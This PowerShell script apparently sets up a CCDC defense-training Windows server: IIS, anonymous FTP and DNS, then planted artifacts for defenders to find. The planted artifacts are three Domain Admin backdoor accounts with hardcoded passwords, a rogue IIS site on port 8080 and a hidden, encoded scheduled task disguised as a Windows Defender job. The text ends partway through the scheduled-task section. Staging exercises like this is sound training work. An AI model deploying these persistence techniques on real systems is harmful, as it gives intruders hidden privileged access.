# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Combined Setup Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Combines every SetupScripts/windows/CCDC_Windows_*.ps1 script into a single
# run, EXCEPT CCDC_Windows_Persistence_ClusterBombShells.ps1 (left out on
# purpose — run that one separately if you want the 5-location startup
# beacon too).
#
# Sections, in order:
#   1. Target setup     — CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1
#                         (IIS HTTP on :80, IIS FTP on :21, DNS zone ccdc.local)
#   2. Rogue users      — CCDC_Windows_Users_UsersAreInYourWalls.ps1
#                         (3 backdoor Domain Admin accounts with adminCount=1)
#   3. Web shell        — CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1
#                         (rogue IIS site on :8080 with ASP page)
#   4. Scheduled tasks  — CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
#                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
#
# The original scripts are untouched and still runnable individually —
# this is just a single-shot version for standing everything up at once.
#
# Usage: Run as Administrator (PowerShell)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# -- Colour helpers (shared by every section) ----------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Windows Combined Setup"
Write-Warn "================================================================"
Write-Host ""

# =============================================================================
# 1. TARGET SETUP — IIS (HTTP), FTP, DNS
# (from CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1)
# =============================================================================
function Invoke-TargetSetup {
    Write-Section "1/4 — Target Setup: HTTP, FTP, DNS"

    # Configuration
    $DnsZoneName   = "ccdc.local"
    $FtpSiteName   = "CCDC-FTP"
    $FtpRoot       = "C:\inetpub\ftproot"
    $FtpPassiveLow = 50000
    $FtpPassiveHigh= 50100
    $WebRoot       = "C:\inetpub\wwwroot"
    $WebSiteName   = "Default Web Site"

    # PRE-FLIGHT: read machine identity and show current state
    Write-Info "PRE-FLIGHT CHECK"

    # Hostname
    $HostName = [System.Net.Dns]::GetHostName()
    Write-Info "Hostname : $HostName"

    # Primary IPv4 - follow the default route, fall back to first non-loopback
    try {
        $defaultRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' |
                        Sort-Object { $_.RouteMetric + $_.InterfaceMetric } |
                        Select-Object -First 1
        $HostIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $defaultRoute.InterfaceIndex `
                    -ErrorAction Stop | Select-Object -First 1).IPAddress
    } catch {
        $HostIP = (Get-NetIPAddress -AddressFamily IPv4 |
                   Where-Object { $_.IPAddress -notmatch '^127\.' } |
                   Select-Object -First 1).IPAddress
    }

    if (-not $HostIP) {
        Write-Err "Could not determine a usable IPv4 address. Check your network adapter."
        exit 1
    }
    Write-Info "Primary IP : $HostIP"
    Write-Info "DNS zone   : $DnsZoneName"
    Write-Host ""

    # Show all IPv4 addresses
    Write-Info "All IPv4 addresses on this machine:"
    Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127\.' } |
        ForEach-Object { Write-Host "    $($_.IPAddress)  (adapter: $((Get-NetAdapter -InterfaceIndex $_.InterfaceIndex -ErrorAction SilentlyContinue).Name))" }
    Write-Host ""

    # Show relevant feature state before we change anything
    Write-Info "Current Windows feature state (relevant roles):"
    $checkFeatures = @('Web-Server','Web-Ftp-Server','DNS','Web-Mgmt-Tools','Web-ASP','Web-ISAPI-Ext')
    foreach ($f in $checkFeatures) {
        $feat = Get-WindowsFeature -Name $f -ErrorAction SilentlyContinue
        if ($feat) {
            $state = if ($feat.Installed) { "[INSTALLED]" } else { "[not installed]" }
            $color = if ($feat.Installed) { "Green" } else { "Yellow" }
            Write-Host "    $($state.PadRight(16)) $f" -ForegroundColor $color
        }
    }
    Write-Host ""

    # Show services that should be running after setup
    Write-Info "Relevant services (current state):"
    foreach ($svc in @('W3SVC','FTPSVC','DNS')) {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) {
            $color = if ($s.Status -eq 'Running') { 'Green' } else { 'Yellow' }
            Write-Host "    $($s.Status.ToString().PadRight(10)) $svc" -ForegroundColor $color
        } else {
            Write-Host "    [absent]   $svc" -ForegroundColor DarkGray
        }
    }
    Write-Host ""

    # -- FEATURE INSTALLATION --
    Write-Info "INSTALL WINDOWS FEATURES"

    $featuresToInstall = @(
        'Web-Server',           # IIS core
        'Web-Common-Http',      # Default doc, directory browsing, static content
        'Web-Default-Doc',
        'Web-Static-Content',
        'Web-Ftp-Server',       # IIS FTP service
        'Web-Ftp-Service',
        'Web-Mgmt-Tools',       # IIS management console + cmdlets
        'Web-Mgmt-Console',
        'Web-Scripting-Tools',
        'DNS'                   # DNS Server role
    )

    Write-Info "Installing roles and features (this may take a few minutes)..."
    try {
        $installResult = Install-WindowsFeature -Name $featuresToInstall -IncludeManagementTools -ErrorAction Stop
        if ($installResult.Success) {
            Write-Success "Features installed."
            if ($installResult.RestartNeeded -eq 'Yes') {
                Write-Warn "A RESTART IS REQUIRED before services will start. Reboot and re-run this script."
                exit 0
            }
        } else {
            Write-Err "Feature installation reported failure."
            exit 1
        }
    } catch {
        Write-Err "Feature installation failed: $_"
        exit 1
    }

    # Load the WebAdministration module now that IIS is installed
    try {
        Import-Module WebAdministration -ErrorAction Stop
        Write-Success "WebAdministration module loaded."
    } catch {
        Write-Err "Could not load WebAdministration: $_"
        Write-Err "Ensure IIS Management Scripting Tools are installed."
        exit 1
    }

    # -- DNS SERVER --
    Write-Info "DNS SERVER"

    Write-Info "Starting DNS service..."
    Set-Service -Name DNS -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name DNS -ErrorAction SilentlyContinue
    $dnsSvc = Get-Service -Name DNS -ErrorAction SilentlyContinue
    if ($dnsSvc.Status -eq 'Running') {
        Write-Success "DNS service running."
    } else {
        Write-Err "DNS service failed to start. Check Event Viewer > System."
        exit 1
    }

    # Create the primary forward lookup zone
    $existingZone = Get-DnsServerZone -Name $DnsZoneName -ErrorAction SilentlyContinue
    if ($existingZone) {
        Write-Warn "Zone '$DnsZoneName' already exists  -  skipping creation."
    } else {
        Write-Info "Creating primary zone: $DnsZoneName ..."
        Add-DnsServerPrimaryZone `
            -Name          $DnsZoneName `
            -ZoneFile      "$DnsZoneName.dns" `
            -DynamicUpdate None `
            -ErrorAction   Stop
        Write-Success "Zone created: $DnsZoneName (file-backed, no dynamic update)"
    }

    # Create/update A record for this server's own hostname
    Write-Info "Adding A record: $HostName.$DnsZoneName -> $HostIP ..."
    $existingA = Get-DnsServerResourceRecord -ZoneName $DnsZoneName -Name $HostName -RRType A -ErrorAction SilentlyContinue
    if ($existingA) {
        Write-Warn "  A record '$HostName' already exists  -  removing and recreating."
        Remove-DnsServerResourceRecord -ZoneName $DnsZoneName -Name $HostName -RRType A -Force -ErrorAction SilentlyContinue
    }
    Add-DnsServerResourceRecordA -ZoneName $DnsZoneName -Name $HostName -IPv4Address $HostIP -ErrorAction Stop
    Write-Success "  A record: $HostName.$DnsZoneName = $HostIP"

    # Zone apex A record (@)
    $existingApex = Get-DnsServerResourceRecord -ZoneName $DnsZoneName -Name "@" -RRType A -ErrorAction SilentlyContinue
    if (-not $existingApex) {
        Add-DnsServerResourceRecordA -ZoneName $DnsZoneName -Name "@" -IPv4Address $HostIP -ErrorAction SilentlyContinue
        Write-Success "  A record: $DnsZoneName (apex) = $HostIP"
    }

    # DNS firewall rules
    Write-Info "Adding DNS firewall rules..."
    foreach ($rule in @(
        @{ Name="DNS UDP 53 (inbound)"; Port=53; Proto="UDP" },
        @{ Name="DNS TCP 53 (inbound)"; Port=53; Proto="TCP" }
    )) {
        Remove-NetFirewallRule -DisplayName $rule.Name -ErrorAction SilentlyContinue
        New-NetFirewallRule `
            -DisplayName $rule.Name `
            -Direction   Inbound `
            -Protocol    $rule.Proto `
            -LocalPort   $rule.Port `
            -Action      Allow `
            -Profile     Any | Out-Null
        Write-Success "  Firewall: $($rule.Name)"
    }

    # -- IIS HTTP --
    Write-Info "IIS HTTP (port 80)"

    Set-Service -Name W3SVC -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name W3SVC -ErrorAction SilentlyContinue
    Write-Success "W3SVC started."

    if (-not (Test-Path $WebRoot)) {
        New-Item -ItemType Directory -Path $WebRoot -Force | Out-Null
        Write-Success "Web root created: $WebRoot"
    }

    $IndexHtml = @"
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CCDC Web Server</title>
  <style>
    body { background:#f4f4f4; font-family:monospace; display:flex; align-items:center;
           justify-content:center; height:100vh; margin:0; }
    .card { background:#fff; border:1px solid #ddd; padding:2rem 3rem; text-align:center; }
    h1   { color:#333; font-size:1.5rem; margin-bottom:0.5rem; }
    p    { color:#666; font-size:0.9rem; margin:0.2rem 0; }
    .badge { display:inline-block; margin-top:1rem; padding:0.2rem 0.6rem;
             background:#e8f5e9; color:#2e7d32; border-radius:3px; font-size:0.8rem; }
  </style>
</head>
<body>
  <div class="card">
    <h1>CCDC Web Server</h1>
    <p>Host: $HostName</p>
    <p>Address: $HostIP</p>
    <span class="badge">HTTP service is running</span>
  </div>
</body>
</html>
"@
    $IndexHtml | Set-Content -Path "$WebRoot\index.html" -Encoding UTF8 -Force
    Write-Success "index.html written: $WebRoot\index.html"

    $site = Get-Website -Name $WebSiteName -ErrorAction SilentlyContinue
    if (-not $site) {
        Write-Info "Creating '$WebSiteName' on port 80..."
        New-Website -Name $WebSiteName -PhysicalPath $WebRoot -Port 80 -IPAddress "*" -Force | Out-Null
        Write-Success "Site created."
    } else {
        Set-ItemProperty "IIS:\Sites\$WebSiteName" -Name physicalPath -Value $WebRoot
        $hasPort80 = ($site | Get-WebBinding | Where-Object { $_.bindingInformation -match ':80:' })
        if (-not $hasPort80) {
            New-WebBinding -Name $WebSiteName -IPAddress "*" -Port 80 -Protocol http | Out-Null
            Write-Success "  Port 80 binding added."
        } else {
            Write-Warn "  '$WebSiteName' already has a port-80 binding  -  left as-is."
        }
    }

    Set-ItemProperty "IIS:\Sites\$WebSiteName" -Name serverAutoStart -Value $true
    Start-Website -Name $WebSiteName -ErrorAction SilentlyContinue
    $siteState = (Get-Website -Name $WebSiteName).State
    Write-Success "Site state: $siteState"

    Remove-NetFirewallRule -DisplayName "HTTP 80 (inbound)" -ErrorAction SilentlyContinue
    New-NetFirewallRule `
        -DisplayName "HTTP 80 (inbound)" `
        -Direction   Inbound `
        -Protocol    TCP `
        -LocalPort   80 `
        -Action      Allow `
        -Profile     Any | Out-Null
    Write-Success "Firewall: HTTP port 80 open."

    # -- IIS FTP --
    Write-Info "IIS FTP (port 21, anonymous)"

    Set-Service -Name FTPSVC -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name FTPSVC -ErrorAction SilentlyContinue
    Write-Success "FTPSVC started."

    if (-not (Test-Path $FtpRoot)) {
        New-Item -ItemType Directory -Path $FtpRoot -Force | Out-Null
        Write-Success "FTP root created: $FtpRoot"
    }

    $ReadmeContent = @"
CCDC Competition Target  -  FTP Service
======================================
Host    : $HostName
Address : $HostIP
Zone    : $DnsZoneName

This FTP site is a scored competition service.
Anonymous read access is enabled.
"@
    $ReadmeContent | Set-Content -Path "$FtpRoot\README.txt" -Encoding UTF8 -Force
    Write-Success "README.txt written: $FtpRoot\README.txt"

    $existingFtp = Get-WebSite -Name $FtpSiteName -ErrorAction SilentlyContinue
    if (-not $existingFtp) {
        $existingFtp = Get-Item "IIS:\Sites\$FtpSiteName" -ErrorAction SilentlyContinue
    }
    if ($existingFtp) {
        Write-Warn "FTP site '$FtpSiteName' already exists  -  removing and recreating."
        Remove-Website -Name $FtpSiteName -ErrorAction SilentlyContinue
    }

    Write-Info "Creating FTP site: $FtpSiteName on port 21..."
    New-WebFtpSite -Name $FtpSiteName -Port 21 -PhysicalPath $FtpRoot -Force | Out-Null
    Write-Success "FTP site created."

    Set-WebConfigurationProperty `
        -Filter   "system.ftpServer/security/authentication/basicAuthentication" `
        -PSPath   "IIS:" `
        -Location $FtpSiteName `
        -Name     "enabled" `
        -Value    $false

    Set-WebConfigurationProperty `
        -Filter   "system.ftpServer/security/authentication/anonymousAuthentication" `
        -PSPath   "IIS:" `
        -Location $FtpSiteName `
        -Name     "enabled" `
        -Value    $true

    Write-Success "FTP auth: anonymous ON, basic OFF."

    Add-WebConfiguration `
        -Filter  "system.ftpServer/security/authorization" `
        -PSPath  "IIS:" `
        -Location $FtpSiteName `
        -Value   @{ accessType = "Allow"; users = "*"; permissions = "Read" } `
        -ErrorAction SilentlyContinue
    Write-Success "FTP authorization: Allow * Read."

    Set-WebConfigurationProperty `
        -Filter "system.ftpServer/firewallSupport" `
        -PSPath "IIS:" `
        -Name   "lowDataChannelPort" `
        -Value  $FtpPassiveLow
    Set-WebConfigurationProperty `
        -Filter "system.ftpServer/firewallSupport" `
        -PSPath "IIS:" `
        -Name   "highDataChannelPort" `
        -Value  $FtpPassiveHigh
    Write-Success "FTP passive range: $FtpPassiveLow-$FtpPassiveHigh"

    Set-WebConfigurationProperty `
        -Filter "system.ftpServer/firewallSupport" `
        -PSPath "IIS:" `
        -Name   "externalIpAddress" `
        -Value  $HostIP
    Write-Success "FTP external IP (PASV response): $HostIP"

    Set-ItemProperty "IIS:\Sites\$FtpSiteName" -Name serverAutoStart -Value $true
    Start-Website -Name $FtpSiteName -ErrorAction SilentlyContinue

    foreach ($rule in @(
        @{ Name="FTP Control TCP 21 (inbound)";          Port=21;                       Proto="TCP" },
        @{ Name="FTP Passive Data TCP $FtpPassiveLow-$FtpPassiveHigh (inbound)"; Port="$FtpPassiveLow-$FtpPassiveHigh"; Proto="TCP" }
    )) {
        Remove-NetFirewallRule -DisplayName $rule.Name -ErrorAction SilentlyContinue
        New-NetFirewallRule `
            -DisplayName $rule.Name `
            -Direction   Inbound `
            -Protocol    $rule.Proto `
            -LocalPort   $rule.Port `
            -Action      Allow `
            -Profile     Any | Out-Null
        Write-Success "Firewall: $($rule.Name)"
    }

    # -- VERIFICATION --
    Write-Info "VERIFICATION"

    foreach ($svc in @('W3SVC','FTPSVC','DNS')) {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        $status = if ($s) { $s.Status } else { 'NOT FOUND' }
        $color  = if ($s -and $s.Status -eq 'Running') { 'Green' } else { 'Red' }
        Write-Host "  $($status.ToString().PadRight(10)) $svc" -ForegroundColor $color
    }
    Write-Host ""

    Write-Info "HTTP local check..."
    try {
        $r = Invoke-WebRequest -Uri "http://localhost" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Success "HTTP $($r.StatusCode)  -  IIS is serving on port 80."
    } catch {
        Write-Warn "Could not reach http://localhost : $_ (service may still be settling)"
    }

    Write-Info "FTP port check..."
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect("127.0.0.1", 21)
        $tcp.Close()
        Write-Success "TCP connect to port 21 succeeded  -  FTP control port is open."
    } catch {
        Write-Warn "Could not connect to FTP port 21: $_"
    }

    Write-Info "DNS resolution check (querying $DnsZoneName from localhost)..."
    try {
        $result = Resolve-DnsName -Name $DnsZoneName -Server 127.0.0.1 -Type A -ErrorAction Stop
        Write-Success "DNS resolved: $DnsZoneName -> $($result.IPAddress)"
    } catch {
        Write-Warn "DNS query failed: $_ (may need a moment to load the zone)"
    }

    Write-Host ""
    Write-Host "  Machine    : $HostName  ($HostIP)" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  HTTP" -ForegroundColor Yellow
    Write-Host "    URL      : http://$HostIP"
    Write-Host "    Web root : $WebRoot"
    Write-Host "    Site     : $WebSiteName"
    Write-Host ""
    Write-Host "  FTP" -ForegroundColor Yellow
    Write-Host "    URL      : ftp://$HostIP"
    Write-Host "    Root     : $FtpRoot"
    Write-Host "    Auth     : anonymous (read only)"
    Write-Host "    Passive  : $FtpPassiveLow - $FtpPassiveHigh"
    Write-Host ""
    Write-Host "  DNS" -ForegroundColor Yellow
    Write-Host "    Zone     : $DnsZoneName (primary, file-backed)"
    Write-Host "    A record : $HostName.$DnsZoneName -> $HostIP"
    Write-Host "    Server   : $HostIP port 53"
    Write-Host ""
    Write-Warn "Point DNS clients at $HostIP to resolve $DnsZoneName queries."
    Write-Warn "Verify scoring checks reach the machine on ports 21, 53, and 80."
}

# =============================================================================
# 2. ROGUE USERS — Domain Admin backdoor accounts
# (from CCDC_Windows_Users_UsersAreInYourWalls.ps1)
# =============================================================================
function Invoke-RogueUsers {
    Write-Section "2/4 — Rogue Users: AD Domain Admin backdoors"

    # Pull domain info dynamically
    try {
        $Domain     = Get-ADDomain -ErrorAction Stop
        $DomainDN   = $Domain.DistinguishedName
        $DomainName = $Domain.DNSRoot
        $DomainNetbios = $Domain.NetBIOSName
        Write-Info "Domain detected: $DomainName  ($DomainDN)"
    } catch {
        Write-Err "Could not retrieve AD domain info. Is this a Domain Controller with the AD module installed?"
        Write-Err "$_"
        exit 1
    }

    $UsersOU = "CN=Users,$DomainDN"

    $AdminGroups = @(
        "Domain Admins",
        "Administrators",
        "Enterprise Admins"
    )

    $EvilUsers = @(
        [PSCustomObject]@{
            Sam         = "JohnRedTeam"
            DisplayName = "John"
            Password    = "S1llyEv1l@2024!"
            Description = "FUCK DONT KILL ME"
        },
        [PSCustomObject]@{
            Sam         = "AdobeAcrobat"
            DisplayName = "AdobeAcrobat"
            Password    = "R3m0veM3@2024!"
            Description = "Service Account"
        },
        [PSCustomObject]@{
            Sam         = "KayneWhitney"
            DisplayName = "Kayne"
            Password    = "F@keUs3r@2024!"
            Description = "Exchange migration service account"
        }
    )

    foreach ($u in $EvilUsers) {
        Write-Info "Processing user: $($u.Sam) ..."

        $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
        $UPN        = "$($u.Sam)@$DomainName"

        $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Warn "  User '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
        } else {
            try {
                New-ADUser `
                    -SamAccountName       $u.Sam `
                    -UserPrincipalName    $UPN `
                    -Name                 $u.DisplayName `
                    -DisplayName          $u.DisplayName `
                    -GivenName            $u.Sam `
                    -Surname              "Training" `
                    -Description          $u.Description `
                    -Path                 $UsersOU `
                    -AccountPassword      $SecurePass `
                    -Enabled              $true `
                    -PasswordNeverExpires $true `
                    -CannotChangePassword $false `
                    -ErrorAction          Stop

                Write-Success "  Created user : $($u.Sam)"
                Write-Success "  UPN          : $UPN"
                Write-Success "  Password     : $($u.Password)"
            } catch {
                Write-Err "  Failed to create user '$($u.Sam)': $_"
                continue
            }
        }

        foreach ($group in $AdminGroups) {
            try {
                Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
                Write-Success "  Added to group: $group"
            } catch {
                if ($group -eq "Enterprise Admins") {
                    Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
                } else {
                    Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
                }
            }
        }

        try {
            Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
            Write-Success "  adminCount set to 1 (SDProp protection bypass)"
        } catch {
            Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
        }

        Write-Host ""
    }
}

# =============================================================================
# 3. WEB SHELL — rogue IIS site on port 8080
# (from CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1)
# =============================================================================
function Invoke-RogueWebShell {
    Write-Section "3/4 — Web Shell: Rogue IIS site on port 8080"

    $SiteName    = "evilwebpage"
    $SitePort    = 8080
    $SitePath    = "C:\inetpub\$SiteName"
    $AppPoolName = "DefaultApp_Pool"

    Write-Info "Checking IIS installation..."

    $iisFeature = Get-WindowsFeature -Name Web-Server -ErrorAction SilentlyContinue
    if (-not $iisFeature.Installed) {
        Write-Warn "IIS not installed  -  installing Web-Server role (this may take a minute)..."
        try {
            Install-WindowsFeature -Name Web-Server, Web-Mgmt-Tools, Web-ASP -IncludeManagementTools -ErrorAction Stop | Out-Null
            Write-Success "IIS installed successfully."
        } catch {
            Write-Err "Failed to install IIS: $_"
            exit 1
        }
    } else {
        Write-Success "IIS is already installed."
    }

    $aspFeature = Get-WindowsFeature -Name Web-ASP -ErrorAction SilentlyContinue
    if ($aspFeature -and -not $aspFeature.Installed) {
        Write-Info "Installing Web-ASP feature..."
        try {
            Install-WindowsFeature -Name Web-ASP -ErrorAction Stop | Out-Null
            Write-Success "Web-ASP installed."
        } catch {
            Write-Err "Failed to install Web-ASP: $_"
            exit 1
        }
    }

    try {
        Import-Module WebAdministration -ErrorAction Stop
        Write-Success "WebAdministration module loaded."
    } catch {
        Write-Err "Could not load WebAdministration module: $_"
        exit 1
    }

    Write-Info "Creating web root: $SitePath ..."
    if (-not (Test-Path $SitePath)) {
        New-Item -ItemType Directory -Path $SitePath -Force | Out-Null
        Write-Success "Directory created: $SitePath"
    } else {
        Write-Warn "Directory already exists: $SitePath"
    }

    Write-Info "Writing evilwebpage ASP page..."
    $HtmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>evilwebpage</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0a0a0a;
      color: #ff2222;
      font-family: 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
      overflow: hidden;
    }

    /* Scanline overlay */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        to bottom,
        transparent 0px,
        transparent 3px,
        rgba(0,0,0,0.15) 3px,
        rgba(0,0,0,0.15) 4px
      );
      pointer-events: none;
      z-index: 10;
    }

    h1 {
      font-size: clamp(2.8rem, 9vw, 7rem);
      font-weight: 900;
      letter-spacing: 0.04em;
      text-transform: uppercase;
      text-shadow:
        0 0 10px  #ff0000,
        0 0 40px  #ff000088,
        0 0 100px #ff000033;
      animation: flicker 3s ease-in-out infinite;
    }

    @keyframes flicker {
      0%,100% { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      92%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      93%      { opacity: 0.4; text-shadow: none; }
      94%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      96%      { opacity: 0.6; text-shadow: none; }
      97%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
    }

    .tagline {
      margin-top: 1.5rem;
      font-size: clamp(0.9rem, 2.5vw, 1.2rem);
      color: #ff6666;
      letter-spacing: 0.1em;
      opacity: 0.85;
    }

    .divider {
      margin: 2.5rem auto;
      width: min(500px, 80%);
      border: none;
      border-top: 1px solid #330000;
    }

    .meta {
      font-size: 0.72rem;
      color: #444;
      line-height: 2;
      letter-spacing: 0.05em;
    }

    .meta .label { color: #882222; }

    .blink {
      animation: blink 1.2s step-start infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }
  </style>
</head>
<body>

  <h1>evilwebpage</h1>
  <p class="tagline">You found a rogue IIS site. <span class="blink">&#9646;</span><br>Investigate. Remediate. Harden.</p>

  <hr class="divider">

  <div class="meta">
    <span class="label">site name&nbsp;&nbsp;&nbsp;:</span> evilwebpage<br>
    <span class="label">server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_NAME")) %><br>
    <span class="label">local addr&nbsp;:</span> <% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %><br>
    <span class="label">server port:</span> <% Response.Write(Request.ServerVariables("SERVER_PORT")) %><br>
    <span class="label">app pool&nbsp;&nbsp;&nbsp;:</span> $AppPoolName<br>
    <span class="label">server sw&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %><br>
    <span class="label">timestamp&nbsp;&nbsp;:</span> <% Response.Write(Now()) %>
  </div>

</body>
</html>
"@

    $HtmlContent | Set-Content -Path "$SitePath\index.asp" -Encoding UTF8 -Force
    Write-Success "index.asp written: $SitePath\index.asp"

    Write-Info "Creating application pool: $AppPoolName ..."
    if (Test-Path "IIS:\AppPools\$AppPoolName") {
        Write-Warn "App pool '$AppPoolName' already exists  -  reconfiguring."
        Remove-WebAppPool -Name $AppPoolName -ErrorAction SilentlyContinue
    }

    New-WebAppPool -Name $AppPoolName | Out-Null
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "startMode"                      -Value "AlwaysRunning"
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "autoStart"                      -Value $true
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "processModel.identityType"      -Value 4
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "recycling.periodicRestart.time" -Value "00:00:00"
    Write-Success "App pool created: $AppPoolName (AlwaysRunning, recycling disabled)"

    if (Get-Website -Name $SiteName -ErrorAction SilentlyContinue) {
        Write-Warn "Site '$SiteName' already exists  -  removing and recreating."
        Remove-Website -Name $SiteName
    }

    Write-Info "Creating IIS site: $SiteName on port $SitePort ..."
    try {
        New-Website `
            -Name            $SiteName `
            -PhysicalPath    $SitePath `
            -ApplicationPool $AppPoolName `
            -Port            $SitePort `
            -IPAddress       "*" `
            -Force `
            -ErrorAction Stop | Out-Null

        Write-Success "IIS site created: $SiteName"
    } catch {
        Write-Err "Failed to create IIS site: $_"
        exit 1
    }

    Set-ItemProperty "IIS:\Sites\$SiteName" -Name "serverAutoStart" -Value $true
    Write-Success "Site set to auto-start on IIS service restart."

    Write-Info "Adding inbound firewall rule for port $SitePort ..."
    $fwRuleName = "evilwebpage-training-port-$SitePort"
    Remove-NetFirewallRule -DisplayName $fwRuleName -ErrorAction SilentlyContinue
    New-NetFirewallRule `
        -DisplayName  $fwRuleName `
        -Direction    Inbound `
        -Protocol     TCP `
        -LocalPort    $SitePort `
        -Action       Allow `
        -Profile      Any `
        -Description  "Training rule - evilwebpage IIS site" | Out-Null
    Write-Success "Firewall rule added: $fwRuleName (TCP $SitePort inbound)"

    Write-Info "Starting site: $SiteName ..."
    Start-Website -Name $SiteName
    $site = Get-Website -Name $SiteName
    if ($site.State -eq "Started") {
        Write-Success "Site is running!"
    } else {
        Write-Err "Site did not start. Check: Get-Website '$SiteName' and Event Viewer > Windows Logs > Application"
    }

    Write-Info "Verifying site responds on localhost:$SitePort ..."
    Start-Sleep -Seconds 2
    try {
        $resp = Invoke-WebRequest -Uri "http://localhost:$SitePort" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Success "HTTP $($resp.StatusCode) received  -  site is live at http://localhost:$SitePort"
    } catch {
        Write-Warn "Could not reach site locally: $_ (site may still be starting)"
    }
}

# =============================================================================
# 4. SCHEDULED TASKS — Notepad alert + service killer
# (from CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1)
# =============================================================================
function Invoke-ScheduledTasks {
    Write-Section "4/4 — Scheduled Tasks: Notepad alert + service killer"

    # ========== TASK 1: SillyNotepadAlert ==========
    $Task1Name        = "NotepadAlert"
    $Task1Description = "Windows Defender credential cache refresh task (do not disable)"
    $Task1MessageFile = "C:\Windows\Temp\sys_alert_msg.txt"
    $Task1Message     = "AHHHHH MY INTERNALS! STOP RUNNING YOUR CYBERSECURITY TOOLS ON MY BODY! THEY HURT! AS A RESULT, I WILL BE REMOVING REGISTRY FILES EVERY TIME YOU SEE THIS"

    $Task1ScriptBlock = @"
Set-Content -Path '$Task1MessageFile' -Value '$Task1Message' -Force
Start-Process -FilePath 'notepad.exe' -ArgumentList '$Task1MessageFile'
"@

    $Task1Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task1ScriptBlock)
    )

    $Task1Action  = New-ScheduledTaskAction `
        -Execute    "powershell.exe" `
        -Argument   "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"

    $Task1Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
        -Once -At (Get-Date).AddSeconds(10)

    $Task1Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task1Principal = New-ScheduledTaskPrincipal `
        -GroupId   "BUILTIN\Users" `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task1Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task1Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName   $Task1Name `
            -Action     $Task1Action `
            -Trigger    $Task1Trigger `
            -Settings   $Task1Settings `
            -Principal  $Task1Principal `
            -Description $Task1Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task1Name"
        Write-Success "  Schedule : every 3 minutes"
